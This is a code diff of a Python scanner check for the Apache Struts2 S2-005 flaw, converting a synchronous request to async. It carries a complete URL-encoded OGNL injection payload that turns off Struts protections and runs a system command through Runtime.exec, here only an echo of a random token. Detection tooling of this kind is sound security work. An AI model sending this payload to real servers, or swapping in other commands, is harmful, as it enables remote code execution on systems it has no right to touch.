@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.encode import urlencode
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.encode import urlencode
+from app.lib.common import get_capta, get_useragent
 
 class S2_005_BaseVerify:
     def __init__(self, url):
@@ -27,7 +27,7 @@ class S2_005_BaseVerify:
         self.capta = get_capta() 
         self.check_payload = '''?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27''' + urlencode(('echo' + ' ' + self.capta), 'utf-8') + '''%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29'''                    
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -38,15 +38,13 @@ class S2_005_BaseVerify:
         """
         
         try:
-            check_req = request.get(self.url + self.check_payload, headers = self.headers, stream=True)
-            if self.capta in check_req.raw.read(50).decode(encoding='utf-8'):
-                return True
-            else:
-                return False
+            check_req = await request.get(self.url + self.check_payload, headers = self.headers)
+            result = await check_req.content.read(50)
+            if result:
+                if self.capta in result.decode(encoding='utf-8'):
+                    return True
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
